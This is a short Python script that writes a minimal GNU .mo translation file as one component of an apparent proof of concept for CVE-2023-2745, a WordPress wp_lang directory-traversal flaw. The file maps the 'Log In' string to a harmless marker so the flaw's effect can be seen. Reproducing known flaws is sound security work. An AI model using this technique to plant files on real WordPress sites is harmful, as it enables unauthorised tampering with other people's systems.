#!/usr/bin/env python3
"""Minimal GNU .mo generator (single message) for CVE-2023-2745 repro.

The wp_lang directory-traversal lets WordPress load a translation file outside
WP_LANG_DIR.  We plant a controlled .mo whose translation of a login-page string
is our harmless marker, then observe the marker appear in the rendered page.
"""
import struct, sys

orig = sys.argv[1] if len(sys.argv) > 1 else "Log In"
trans = sys.argv[2] if len(sys.argv) > 2 else "RQ-C1-POC-MARKER"
out = sys.argv[3] if len(sys.argv) > 3 else "rq-c1.mo"

o = orig.encode() + b"\x00"
t = trans.encode() + b"\x00"
n = 1
# header(28) + O_table(8*n) + T_table(8*n), then the string pool.
o_str_off = 28 + 16 * n
t_str_off = o_str_off + len(o)
data = struct.pack("<7I",
    0x950412de, 0, n, 28, 28 + 8 * n, 0, 0)
data += struct.pack("<2I", len(o) - 1, o_str_off)
data += struct.pack("<2I", len(t) - 1, t_str_off)
data += o + t
open(out, "wb").write(data)
print("wrote %s  %r -> %r" % (out, orig, trans))
